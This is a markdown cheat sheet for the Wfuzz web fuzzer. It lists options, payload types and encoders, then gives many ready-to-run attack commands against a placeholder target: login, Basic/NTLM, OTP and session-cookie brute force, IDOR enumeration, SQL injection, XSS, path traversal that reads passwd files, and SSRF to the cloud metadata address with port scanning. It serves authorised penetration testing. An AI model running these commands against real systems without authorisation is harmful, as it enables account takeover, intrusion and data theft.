# 🕷️ Wfuzz — Web Application Fuzzer

> Complete reference for **Wfuzz**, the powerful Python-based web fuzzer. Covers installation, all options, payload types, encoders, filters, and real-world attack scenarios — directory brute-forcing, subdomain discovery, login brute-force, parameter fuzzing, header injection, cookie fuzzing, and more.

---

## Table of Contents

- [Overview](#overview)
- [Installation](#installation)
- [Basic Syntax](#basic-syntax)
- [FUZZ Markers](#fuzz-markers)
- [All Options Reference](#all-options-reference)
- [Payload Types (-z)](#payload-types--z)
- [Filters (Hide / Show)](#filters-hide--show)
- [Encoders](#encoders)
- [Output Options](#output-options)
- [Usage 1 — Directory & File Discovery](#usage-1--directory--file-discovery)
- [Usage 2 — Subdomain Fuzzing](#usage-2--subdomain-fuzzing)
- [Usage 3 — Login Brute Force (POST)](#usage-3--login-brute-force-post)
- [Usage 4 — GET Parameter Fuzzing](#usage-4--get-parameter-fuzzing)
- [Usage 5 — Header Fuzzing](#usage-5--header-fuzzing)
- [Usage 6 — Cookie Fuzzing](#usage-6--cookie-fuzzing)
- [Usage 7 — Multi-Position Fuzzing](#usage-7--multi-position-fuzzing)
- [Usage 8 — Authentication (Basic/NTLM)](#usage-8--authentication-basicntlm)
- [Usage 9 — Virtual Host (VHost) Discovery](#usage-9--virtual-host-vhost-discovery)
- [Usage 10 — API Parameter Fuzzing](#usage-10--api-parameter-fuzzing)
- [Usage 11 — IDOR / ID Enumeration](#usage-11--idor--id-enumeration)
- [Usage 12 — SQL Injection Fuzzing](#usage-12--sql-injection-fuzzing)
- [Usage 13 — XSS Fuzzing](#usage-13--xss-fuzzing)
- [Usage 14 — Path Traversal Fuzzing](#usage-14--path-traversal-fuzzing)
- [Usage 15 — SSRF Fuzzing](#usage-15--ssrf-fuzzing)
- [Usage 16 — Proxy Through Burp Suite](#usage-16--proxy-through-burp-suite)
- [Usage 17 — Scan Mode (Ignore Errors)](#usage-17--scan-mode-ignore-errors)
- [Usage 18 — Recursion](#usage-18--recursion)
- [Wfuzz as Python Library](#wfuzz-as-python-library)
- [wfpayload & wfencode](#wfpayload--wfencode)
- [Wordlists Reference](#wordlists-reference)
- [Complete Testing Checklist](#complete-testing-checklist)
- [Comparison with Similar Tools](#comparison-with-similar-tools)
- [References](#references)

---

## Overview

Wfuzz is an open-source web application fuzzer designed for brute-forcing web applications. It is highly flexible and can fuzz any parameter in an HTTP request — URLs, headers, POST data, and cookies. It supports complex fuzzing scenarios through multiple payload sources, advanced filtering, and result analysis capabilities.

### Why Wfuzz

```
✔ Fuzz ANY part of an HTTP request — URL, headers, body, cookies
✔ Multiple simultaneous FUZZ positions
✔ 30+ built-in payload types (file, range, list, stdin, etc.)
✔ 30+ built-in encoders (base64, md5, url, hex, etc.)
✔ Powerful filter system (hide/show by code, lines, words, chars, regex)
✔ Usable as a Python library for custom automation
✔ Proxy support (Burp Suite integration)
✔ Scan mode (ignore connection errors)
✔ Recursion for deep directory discovery
```

---

## Installation

```bash
# Kali Linux (pre-installed)
wfuzz --help

# pip
pip install wfuzz

# pip3
pip3 install wfuzz

# From source
git clone https://github.com/xmendez/wfuzz
cd wfuzz
python setup.py install

# Verify
wfuzz --version
```

---

## Basic Syntax

```
wfuzz [options] -w wordlist <URL>
wfuzz [options] -z payload,params <URL>
```

```
FUZZ  → replaced by each payload value
FUZ2Z → second payload position (for multi-fuzzing)
FUZ3Z → third payload position
```

### Minimal Example

```bash
# Directory bruteforce — hide 404s
wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 404 http://target.com/FUZZ
```

---

## FUZZ Markers

| Marker | Position | Description |
|---|---|---|
| `FUZZ` | First payload | Replaced by first `-w` or `-z` payload |
| `FUZ2Z` | Second payload | Replaced by second `-w` or `-z` payload |
| `FUZ3Z` | Third payload | Replaced by third `-w` or `-z` payload |
| `FUZnZ` | nth payload | For any additional `-w`/`-z` arguments |

```bash
# Single position
wfuzz -w wordlist.txt http://target.com/FUZZ

# Two positions (cluster bomb / pitchfork)
wfuzz -w users.txt -w pass.txt -d "user=FUZZ&pass=FUZ2Z" http://target.com/login
```

---

## All Options Reference

### Request Options

```
-u URL            Target URL (alternative to positional arg)
-d postdata       POST data string ("user=FUZZ&pass=test")
-H header         Add/modify a header ("Authorization: Bearer FUZZ")
-b cookie         Cookie ("session=FUZZ")
-m iterator       Payload iterator: product, zip, chain (default: product)
-X method         HTTP method (GET, POST, PUT, DELETE, etc.)
--data            Alias for -d
--cookie          Alias for -b
```

### Payload Options

```
-w wordlist       Shorthand — wordlist file as payload
-z payload,params Specify payload type and params
                  Examples:
                    -z file,/path/to/wordlist.txt
                    -z list,admin-user-test
                    -z range,1-100
                    -z stdin
--zP params       Additional params for the payload
--zD default      Default value when payload is exhausted
```

### Filter Options (Hide)

```
--hc codes        Hide responses by HTTP status code(s) e.g. --hc 404,403
--hl lines        Hide responses by line count       e.g. --hl 10
--hw words        Hide responses by word count       e.g. --hw 50
--hh chars        Hide responses by char count       e.g. --hh 1024
--hr regex        Hide responses matching regex      e.g. --hr "not found"
```

### Filter Options (Show)

```
--sc codes        Show ONLY responses with status code(s) e.g. --sc 200,302
--sl lines        Show ONLY responses with line count     e.g. --sl 5
--sw words        Show ONLY responses with word count     e.g. --sw 40
--sh chars        Show ONLY responses with char count     e.g. --sh 177
--sr regex        Show ONLY responses matching regex      e.g. --sr "admin"
```

### Performance Options

```
-t threads        Number of concurrent threads (default: 10)
-s delay          Delay between requests in seconds (e.g. -s 0.5)
-R depth          Recursion depth for directory fuzzing
-Z                Scan mode — ignore errors and continue
--timeout secs    HTTP request timeout (default: 30)
--req-delay secs  Max time waiting for a response
```

### Authentication Options

```
--basic user:pass   HTTP Basic Auth
--ntlm  user:pass   NTLM authentication
--digest user:pass  HTTP Digest Auth
```

### Output Options

```
-c                Colorized output
-v                Verbose output (show full request/response)
-o format         Output format: raw, json, csv, html, magictree
-f filename,fmt   Save output to file: -f results.json,json
--oF filename     Output to file (raw format)
```

### Proxy & Misc

```
-p proxy          Use proxy: -p 127.0.0.1:8080
                             -p 127.0.0.1:8080:SOCKS4
                             -p 127.0.0.1:8080:SOCKS5
--follow          Follow HTTP redirects
--no-cache        Disable DNS cache
--script name     Run a Wfuzz script/plugin
--script-args     Arguments for wfuzz scripts
```

---

## Payload Types (-z)

```bash
# List all available payload types
wfuzz -e payloads
```

| Payload | Description | Example |
|---|---|---|
| `file` | Wordlist from file | `-z file,/path/to/list.txt` |
| `list` | Inline comma-separated list | `-z list,admin-user-test-guest` |
| `range` | Numeric range | `-z range,1-1000` |
| `stdin` | Read from stdin | `-z stdin` |
| `names` | Name combinations | `-z names` |
| `iprange` | IP address range | `-z iprange,192.168.1.0-255` |
| `hexrange` | Hex range | `-z hexrange,0x00-0xFF` |
| `hexrand` | Random hex values | `-z hexrand,8` |
| `permutation` | Character permutations | `-z permutation,ab-2` |
| `bing` | Bing search results | `-z bing,site:target.com` |
| `googler` | Google search results | `-z googler,site:target.com` |
| `burplog` | Burp proxy log file | `-z burplog,/path/burp.log` |
| `burpstate` | Burp state file | `-z burpstate,/path/burp.state` |
| `wfuzzp` | Wfuzz payload file | `-z wfuzzp,/path/payload.txt` |

### Common Examples

```bash
# File payload (most common)
wfuzz -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  --hc 404 http://target.com/FUZZ

# List payload (inline values)
wfuzz -z list,admin-administrator-manager-root \
  --hc 404 http://target.com/FUZZ

# Range payload (numeric IDs)
wfuzz -z range,1-500 --hc 404 http://target.com/user?id=FUZZ

# Stdin payload (piped input)
cat wordlist.txt | wfuzz -z stdin --hc 404 http://target.com/FUZZ
```

---

## Filters (Hide / Show)

The tool offers sophisticated filtering capabilities based on response codes, content length, word count, and regex patterns, helping identify meaningful results in large fuzzing operations.

### Hide Filters (Most Common)

```bash
# Hide 404 Not Found
wfuzz -w wordlist.txt --hc 404 http://target.com/FUZZ

# Hide multiple codes
wfuzz -w wordlist.txt --hc 404,403,400 http://target.com/FUZZ

# Hide by word count (e.g. hide all responses with 50 words — same as error page)
wfuzz -w wordlist.txt --hw 50 http://target.com/FUZZ

# Hide by character count (baseline error page = 1024 chars)
wfuzz -w wordlist.txt --hh 1024 http://target.com/FUZZ

# Hide by line count
wfuzz -w wordlist.txt --hl 10 http://target.com/FUZZ

# Hide responses matching regex
wfuzz -w wordlist.txt --hr "Page not found" http://target.com/FUZZ
```

### Show Filters (Whitelist)

```bash
# Show ONLY 200 OK
wfuzz -w wordlist.txt --sc 200 http://target.com/FUZZ

# Show 200 and 301 (success and redirect)
wfuzz -w wordlist.txt --sc 200,301,302 http://target.com/FUZZ

# Show responses with regex match
wfuzz -w wordlist.txt --sr "admin|dashboard|welcome" http://target.com/FUZZ

# Show ONLY specific word count
wfuzz -w wordlist.txt --sw 40 http://target.com/FUZZ
```

### Combining Filters

```bash
# Hide 404 AND show only responses with "admin" in body
wfuzz -w wordlist.txt --hc 404 --sr "admin" http://target.com/FUZZ

# Hide 404 AND hide short responses (likely errors)
wfuzz -w wordlist.txt --hc 404 --hh 0 http://target.com/FUZZ
```

---

## Encoders

```bash
# List all available encoders
wfuzz -e encoders
```

| Encoder | Description | Example |
|---|---|---|
| `base64` | Base64 encode | `-z file,list.txt,base64` |
| `base64_decode` | Base64 decode | `-z file,list.txt,base64_decode` |
| `url` | URL encode | `-z file,list.txt,url` |
| `urlencode` | Full URL encode | `-z file,list.txt,urlencode` |
| `double_urlencode` | Double URL encode | `-z file,list.txt,double_urlencode` |
| `md5` | MD5 hash | `-z file,list.txt,md5` |
| `sha1` | SHA1 hash | `-z file,list.txt,sha1` |
| `sha256` | SHA256 hash | `-z file,list.txt,sha256` |
| `html` | HTML encode | `-z file,list.txt,html` |
| `htmlparser` | HTML decode | `-z file,list.txt,htmlparser` |
| `hex` | Hexadecimal encode | `-z file,list.txt,hex` |
| `random_upper` | Random uppercase letters | `-z file,list.txt,random_upper` |
| `none` | No encoding (default) | `-z file,list.txt,none` |

### Applying Encoders

```bash
# Syntax: -z payload,wordlist,ENCODER
wfuzz -z file,payloads.txt,base64 \
  -d "data=FUZZ" http://target.com/submit

# URL encode all payloads
wfuzz -z file,sqli.txt,urlencode \
  --hc 404 "http://target.com/search?q=FUZZ"

# MD5 hash payloads (password hashing bypass)
wfuzz -z file,passwords.txt,md5 \
  -d "password=FUZZ" http://target.com/login

# Multiple encoders chained (pipe with -)
wfuzz -z file,payloads.txt,base64-urlencode \
  "http://target.com/FUZZ"
```

---

## Output Options

```bash
# Colorized output (always recommended)
wfuzz -c -w wordlist.txt --hc 404 http://target.com/FUZZ

# Verbose (full request + response)
wfuzz -v -w wordlist.txt --hc 404 http://target.com/FUZZ

# Save to JSON
wfuzz -c -w wordlist.txt --hc 404 \
  -f results.json,json http://target.com/FUZZ

# Save to CSV
wfuzz -c -w wordlist.txt --hc 404 \
  -f results.csv,csv http://target.com/FUZZ

# Save to HTML report
wfuzz -c -w wordlist.txt --hc 404 \
  -f report.html,html http://target.com/FUZZ
```

### Output Columns Explained

```
ID    Response  Lines  Words  Chars   Payload
001   200       4 L    25 W   177 Ch  "admin"
002   301       9 L    28 W   319 Ch  "images"
003   403       10 L   29 W   263 Ch  "cgi-bin"
```

---

## Usage 1 — Directory & File Discovery

```bash
# Basic directory brute-force
wfuzz -c -w /usr/share/wordlists/dirb/common.txt \
  --hc 404 http://target.com/FUZZ

# With file extensions
wfuzz -c -w /usr/share/wordlists/dirb/common.txt \
  --hc 404 "http://target.com/FUZZ.php"

wfuzz -c -w /usr/share/wordlists/dirb/common.txt \
  --hc 404 "http://target.com/FUZZ.{php,html,js,txt,bak}"

# Using dirbuster wordlist (more thorough)
wfuzz -c -t 30 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  --hc 404 http://target.com/FUZZ

# Recursive directory fuzzing
wfuzz -c -R 2 \
  -w /usr/share/wordlists/dirb/common.txt \
  --hc 404 http://target.com/FUZZ

# Show 200, 301, 302 only
wfuzz -c \
  -w /usr/share/wordlists/dirb/common.txt \
  --sc 200,301,302 http://target.com/FUZZ

# Hidden files (dot files)
wfuzz -c -w /usr/share/wordlists/dirb/common.txt \
  --hc 404 "http://target.com/.FUZZ"

# Backup files
wfuzz -c -z list,.bak-.old-.backup-.swp-.orig \
  --hc 404 "http://target.com/index.phpFUZZ"
```

---

## Usage 2 — Subdomain Fuzzing

```bash
# Basic subdomain discovery
wfuzz -c -Z \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  --hc 400,404 \
  -H "Host: FUZZ.target.com" \
  http://target.com

# Alternative — FUZZ in URL
wfuzz -c -Z \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  --hc 400,404 \
  http://FUZZ.target.com

# Filter by specific response size (baseline the main domain first)
wfuzz -c -Z \
  -w subdomains.txt \
  --hh 1234 \
  http://FUZZ.target.com

# With inline list
wfuzz -c -z list,www-mail-dev-staging-api-admin-blog-vpn \
  --hc 400,404 http://FUZZ.target.com
```

---

## Usage 3 — Login Brute Force (POST)

```bash
# Single wordlist for password (known username)
wfuzz -c \
  -w /opt/SecLists/Passwords/Common-Credentials/10k-most-common.txt \
  --sc 200,302 \
  -d "username=admin&password=FUZZ" \
  http://target.com/login

# Brute force both username and password (cluster bomb)
wfuzz -c \
  -w /opt/SecLists/Usernames/top-usernames-shortlist.txt \
  -w /opt/SecLists/Passwords/Common-Credentials/10k-most-common.txt \
  --sc 200,302 \
  -d "username=FUZZ&password=FUZ2Z" \
  http://target.com/login

# With cookie / CSRF token (copy from browser)
wfuzz -c \
  -w passwords.txt \
  -b "PHPSESSID=abc123; csrf_token=xyz" \
  -d "username=admin&password=FUZZ&csrf=FIXED_TOKEN" \
  --sc 302 \
  http://target.com/login

# JSON login endpoint
wfuzz -c \
  -w passwords.txt \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"FUZZ"}' \
  --sc 200 \
  http://target.com/api/login

# Filter by response text (success message)
wfuzz -c \
  -w passwords.txt \
  -d "user=admin&pass=FUZZ" \
  --sr "Welcome|dashboard|success" \
  http://target.com/login
```

---

## Usage 4 — GET Parameter Fuzzing

```bash
# Fuzz a GET parameter value
wfuzz -c -w wordlist.txt \
  --hc 404 \
  "http://target.com/page?id=FUZZ"

# Multiple GET parameters
wfuzz -c -w wordlist.txt \
  --hc 404 \
  "http://target.com/page?cat=FUZZ&page=1"

# Discover hidden GET parameters
wfuzz -c \
  -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
  --hh 1024 \
  "http://target.com/page?FUZZ=test"

# Parameter value fuzzing with range
wfuzz -c -z range,1-1000 \
  --hc 404 \
  "http://target.com/download?file=FUZZ"
```

---

## Usage 5 — Header Fuzzing

```bash
# Fuzz Authorization header (Bearer token)
wfuzz -c \
  -w /opt/SecLists/Fuzzing/Databases/wordlist-probable-v2.txt \
  -H "Authorization: Bearer FUZZ" \
  --sc 200 \
  http://target.com/api/admin

# Fuzz User-Agent
wfuzz -c \
  -w /opt/SecLists/Fuzzing/User-Agents/user-agents.txt \
  -H "User-Agent: FUZZ" \
  --sc 200 \
  http://target.com/

# Fuzz X-Forwarded-For (IP bypass)
wfuzz -c \
  -z iprange,127.0.0.0-127.0.0.255 \
  -H "X-Forwarded-For: FUZZ" \
  --sc 200 \
  http://target.com/admin

# Fuzz API key header
wfuzz -c \
  -w api_keys.txt \
  -H "X-API-Key: FUZZ" \
  --sc 200 \
  http://target.com/api/data

# Fuzz custom header name discovery
wfuzz -c \
  -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
  -H "FUZZ: test" \
  --sc 200 \
  http://target.com/
```

---

## Usage 6 — Cookie Fuzzing

```bash
# Brute force session ID
wfuzz -c \
  -w /opt/SecLists/Fuzzing/alphanum-case-extra.txt \
  -b "session=FUZZ" \
  --sc 200 \
  http://target.com/dashboard

# Fuzz a specific cookie value
wfuzz -c \
  -z range,1-10000 \
  -b "user_id=FUZZ" \
  --sc 200 \
  http://target.com/profile

# Multiple cookies — fuzz one, keep one
wfuzz -c \
  -w tokens.txt \
  -b "auth=FUZZ; lang=en" \
  --sc 200 \
  http://target.com/admin
```

---

## Usage 7 — Multi-Position Fuzzing

```bash
# Two payload positions — product (all combinations)
wfuzz -c \
  -w users.txt \
  -w passwords.txt \
  -d "user=FUZZ&pass=FUZ2Z" \
  --sc 302 \
  http://target.com/login

# Two positions — zip iterator (pairwise, not all combinations)
wfuzz -c -m zip \
  -w users.txt \
  -w passwords.txt \
  -d "user=FUZZ&pass=FUZ2Z" \
  --sc 302 \
  http://target.com/login

# Three positions
wfuzz -c \
  -w users.txt \
  -w passwords.txt \
  -w otp_list.txt \
  -d "user=FUZZ&pass=FUZ2Z&otp=FUZ3Z" \
  --sc 200 \
  http://target.com/login-2fa

# FUZZ in URL + header
wfuzz -c \
  -w dirs.txt \
  -w tokens.txt \
  -H "Authorization: Bearer FUZ2Z" \
  --sc 200 \
  http://target.com/api/FUZZ
```

---

## Usage 8 — Authentication (Basic/NTLM)

```bash
# HTTP Basic Auth brute force
wfuzz -c \
  -w /opt/SecLists/Passwords/Common-Credentials/10k-most-common.txt \
  --basic "admin:FUZZ" \
  --sc 200 \
  http://target.com/protected/

# Basic auth — fuzz username AND password
wfuzz -c \
  -w users.txt \
  -w passwords.txt \
  --basic "FUZZ:FUZ2Z" \
  --sc 200 \
  http://target.com/protected/

# NTLM auth
wfuzz -c \
  -w passwords.txt \
  --ntlm "DOMAIN\admin:FUZZ" \
  --sc 200 \
  http://target.com/protected/
```

---

## Usage 9 — Virtual Host (VHost) Discovery

```bash
# VHost fuzzing via Host header
wfuzz -c \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  -H "Host: FUZZ.target.com" \
  --sc 200 \
  http://<TARGET_IP>

# Filter by non-default response (baseline first)
# 1. Get baseline character count: curl -s http://TARGET_IP/ | wc -c → 1234
# 2. Hide baseline size:
wfuzz -c \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  -H "Host: FUZZ.target.com" \
  --hh 1234 \
  http://<TARGET_IP>
```

---

## Usage 10 — API Parameter Fuzzing

```bash
# Discover hidden JSON fields
wfuzz -c \
  -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"FUZZ":"test"}' \
  --hc 400,404 \
  http://target.com/api/user

# REST path fuzzing
wfuzz -c \
  -w /opt/SecLists/Discovery/Web-Content/api/api-endpoints.txt \
  -H "Authorization: Bearer YOUR_TOKEN" \
  --hc 404 \
  http://target.com/api/v1/FUZZ

# Fuzz API version
wfuzz -c \
  -z list,v1-v2-v3-v4-v5 \
  --hc 404 \
  http://target.com/api/FUZZ/users
```

---

## Usage 11 — IDOR / ID Enumeration

```bash
# Numeric ID enumeration
wfuzz -c \
  -z range,1-1000 \
  -b "session=YOUR_SESSION" \
  --hc 404,403 \
  http://target.com/api/user/FUZZ

# UUID guessing (from leaked IDs)
wfuzz -c \
  -w uuids.txt \
  -b "session=YOUR_SESSION" \
  --hc 404 \
  http://target.com/api/document/FUZZ

# Parameter ID in POST body
wfuzz -c \
  -z range,1-500 \
  -b "session=YOUR_SESSION" \
  -d "user_id=FUZZ&action=view" \
  --hc 404,403 \
  http://target.com/api/profile
```

---

## Usage 12 — SQL Injection Fuzzing

```bash
# SQLi in GET parameter
wfuzz -c \
  -w /opt/SecLists/Fuzzing/SQLi/Generic-SQLi.txt \
  --hc 404 \
  "http://target.com/page?id=FUZZ"

# URL-encoded SQLi payloads
wfuzz -c \
  -z file,/opt/SecLists/Fuzzing/SQLi/Generic-SQLi.txt,urlencode \
  --hc 404 \
  "http://target.com/search?q=FUZZ"

# SQLi in POST data
wfuzz -c \
  -w /opt/SecLists/Fuzzing/SQLi/Generic-SQLi.txt \
  -d "username=FUZZ&password=test" \
  --sr "error|sql|syntax|mysql|ora-" \
  http://target.com/login

# Detect time-based SQLi by response time difference
wfuzz -c \
  -z list,"1 AND SLEEP(5)"-"1" \
  "http://target.com/page?id=FUZZ"
# Compare response times — large gap = time-based SQLi
```

---

## Usage 13 — XSS Fuzzing

```bash
# Basic XSS payloads
wfuzz -c \
  -w /opt/SecLists/Fuzzing/XSS/XSS-Jhaddix.txt \
  --hc 404 \
  "http://target.com/search?q=FUZZ"

# URL-encoded XSS
wfuzz -c \
  -z file,/opt/SecLists/Fuzzing/XSS/XSS-Jhaddix.txt,urlencode \
  --sr "alert|onerror|onload|script" \
  "http://target.com/search?q=FUZZ"

# XSS in POST body
wfuzz -c \
  -w /opt/SecLists/Fuzzing/XSS/XSS-Jhaddix.txt \
  -d "comment=FUZZ&submit=1" \
  --sr "alert|<script" \
  http://target.com/comment
```

---

## Usage 14 — Path Traversal Fuzzing

```bash
# LFI payloads
wfuzz -c \
  -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
  --hc 404 \
  --sr "root:|bin:|daemon:" \
  "http://target.com/download?file=FUZZ"

# Path traversal in URL
wfuzz -c \
  -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
  --hc 404 \
  "http://target.com/page/FUZZ"

# URL-encoded traversal
wfuzz -c \
  -z file,/opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt,urlencode \
  --hc 404 \
  "http://target.com/include?page=FUZZ"
```

---

## Usage 15 — SSRF Fuzzing

```bash
# Internal IP range fuzzing
wfuzz -c \
  -z iprange,192.168.1.1-192.168.1.254 \
  --hc 404,400 \
  "http://target.com/fetch?url=http://FUZZ/"

# Common SSRF endpoints
wfuzz -c \
  -z list,"http://127.0.0.1"-"http://localhost"-"http://169.254.169.254/latest/meta-data/" \
  --hc 400,404 \
  "http://target.com/proxy?url=FUZZ"

# Port scanning via SSRF
wfuzz -c \
  -z range,1-65535 \
  --sc 200 \
  "http://target.com/fetch?url=http://127.0.0.1:FUZZ/"
```

---

## Usage 16 — Proxy Through Burp Suite

```bash
# Route all Wfuzz traffic through Burp Suite
wfuzz -c \
  -w wordlist.txt \
  -p 127.0.0.1:8080 \
  --hc 404 \
  http://target.com/FUZZ

# HTTPS through Burp
wfuzz -c \
  -w wordlist.txt \
  -p 127.0.0.1:8080 \
  --hc 404 \
  https://target.com/FUZZ

# SOCKS proxy
wfuzz -c \
  -w wordlist.txt \
  -p 127.0.0.1:9050:SOCKS5 \
  --hc 404 \
  http://target.com/FUZZ
```

---

## Usage 17 — Scan Mode (Ignore Errors)

```bash
# -Z flag: continue on connection errors / timeouts
wfuzz -c -Z \
  -w wordlist.txt \
  --hc 404 \
  http://target.com/FUZZ

# Useful for:
# - Subdomain fuzzing (many subdomains won't resolve)
# - IP range fuzzing (many IPs won't respond)
# - Unstable targets
```

---

## Usage 18 — Recursion

```bash
# Recursive directory discovery (depth 2)
wfuzz -c -R 2 \
  -w /usr/share/wordlists/dirb/common.txt \
  --hc 404 \
  http://target.com/FUZZ/

# Depth 3 with threads
wfuzz -c -R 3 -t 20 \
  -w /usr/share/wordlists/dirb/common.txt \
  --hc 404 \
  http://target.com/FUZZ/
```

---

## Wfuzz as Python Library

Fuzzing a URL with the Wfuzz library is very simple. Import the wfuzz module and iterate over results.

```python
import wfuzz

# Basic directory fuzzing
for r in wfuzz.fuzz(
    url="http://target.com/FUZZ",
    hc=[404],
    payloads=[("file", dict(fn="wordlist/general/common.txt"))]
):
    print(r)
```

```python
# Advanced usage with filters
import wfuzz

for r in wfuzz.fuzz(
    url="http://target.com/FUZZ",
    hc=[404, 403],
    sc=[200, 301],
    payloads=[("file", dict(fn="/usr/share/wordlists/dirb/common.txt"))],
    concurrent=20
):
    print(f"[{r.code}] {r.url} — {r.chars} chars")
```

```python
# Login brute force as library
import wfuzz

for r in wfuzz.fuzz(
    url="http://target.com/login",
    method="POST",
    postdata="username=admin&password=FUZZ",
    sc=[200, 302],
    payloads=[("file", dict(fn="passwords.txt"))]
):
    if r.code in [200, 302]:
        print(f"[+] Valid password: {r.payload[0]}")
```

---

## wfpayload & wfencode

> Utility tools installed alongside Wfuzz when built from source.

```bash
# wfpayload — generate payload values
# Generate digits 0-15
wfpayload -z range,0-15

# Generate all items from a wordlist
wfpayload -z file,/usr/share/wordlists/dirb/common.txt

# Generate inline list
wfpayload -z list,admin-user-test

# wfencode — encode a value using any encoder
wfencode -e base64 "hello world"
# Output: aGVsbG8gd29ybGQ=

wfencode -e md5 "password"
# Output: 5f4dcc3b5aa765d61d8327deb882cf99

wfencode -e urlencode "admin' OR '1'='1"
# Output: admin%27+OR+%271%27%3D%271
```

---

## Wordlists Reference

| Wordlist | Path | Use Case |
|---|---|---|
| Common dirs | `/usr/share/wordlists/dirb/common.txt` | Quick directory scan |
| Large dirs | `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` | Thorough dir scan |
| Big dirs | `/usr/share/wordlists/dirbuster/directory-list-2.3-big.txt` | Deep dir scan |
| Subdomains 5k | `/opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt` | Fast subdomain |
| Subdomains 20k | `/opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt` | Thorough subdomain |
| Parameters | `/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt` | Param discovery |
| API endpoints | `/opt/SecLists/Discovery/Web-Content/api/api-endpoints.txt` | API discovery |
| Common passwords | `/opt/SecLists/Passwords/Common-Credentials/10k-most-common.txt` | Password brute |
| Usernames | `/opt/SecLists/Usernames/top-usernames-shortlist.txt` | Username enum |
| SQLi payloads | `/opt/SecLists/Fuzzing/SQLi/Generic-SQLi.txt` | SQL injection |
| XSS payloads | `/opt/SecLists/Fuzzing/XSS/XSS-Jhaddix.txt` | XSS testing |
| LFI payloads | `/opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt` | Path traversal |

---

## Complete Testing Checklist

### Setup
- [ ] Wfuzz installed and version confirmed?
- [ ] SecLists wordlists available?
- [ ] Baseline response established (default page size/words)?
- [ ] Correct FUZZ marker placed in right position?
- [ ] Proxy configured if routing through Burp?

### Filters
- [ ] Baseline page chars noted → `--hh <baseline>` applied?
- [ ] OR `--hc 404` applied for standard dir fuzzing?
- [ ] `--sc` whitelist applied for brute force?
- [ ] Regex filter `--sr`/`--hr` applied where needed?

### Coverage
- [ ] Directories fuzzed?
- [ ] Files with extensions fuzzed (.php, .bak, .txt)?
- [ ] Subdomains fuzzed?
- [ ] GET parameters fuzzed (values + parameter names)?
- [ ] POST parameters fuzzed?
- [ ] Headers fuzzed (Auth, X-Forwarded-For, User-Agent)?
- [ ] Cookies fuzzed?
- [ ] VHosts fuzzed (via Host header)?
- [ ] API endpoints and versions fuzzed?
- [ ] IDOR IDs enumerated (range 1-1000+)?

### Attack-Specific
- [ ] Login brute-forced (username + password)?
- [ ] OTP/PIN brute-forced?
- [ ] SQLi payloads fuzzed in all inputs?
- [ ] XSS payloads fuzzed in reflected parameters?
- [ ] LFI/path traversal payloads fuzzed in file parameters?
- [ ] SSRF payloads fuzzed in URL-accepting parameters?

---

## Comparison with Similar Tools

| Feature | Wfuzz | ffuf | Gobuster | Feroxbuster |
|---|---|---|---|---|
| Language | Python | Go | Go | Rust |
| Speed | Medium | Fast | Fast | Very Fast |
| Multi-FUZZ positions | ✅ | ✅ | ❌ | ❌ |
| Header fuzzing | ✅ | ✅ | ❌ | ✅ |
| Cookie fuzzing | ✅ | ✅ | ❌ | ✅ |
| POST body fuzzing | ✅ | ✅ | ❌ | ✅ |
| Encoders built-in | ✅ 30+ | ✅ basic | ❌ | ❌ |
| Python library API | ✅ | ❌ | ❌ | ❌ |
| Filter by words/chars | ✅ | ✅ | ❌ | ✅ |
| Recursion | ✅ | ✅ | ✅ | ✅ |
| Output formats | ✅ JSON,CSV,HTML | ✅ JSON | ✅ | ✅ |

---

## References

- Wfuzz Official Documentation — [wfuzz.readthedocs.io](https://wfuzz.readthedocs.io)
- GitHub — [xmendez/wfuzz](https://github.com/xmendez/wfuzz)
- Kali Linux Tools — [kali.org/tools/wfuzz](https://www.kali.org/tools/wfuzz/)
- SecLists — [github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
- OWASP Testing Guide — Fuzzing
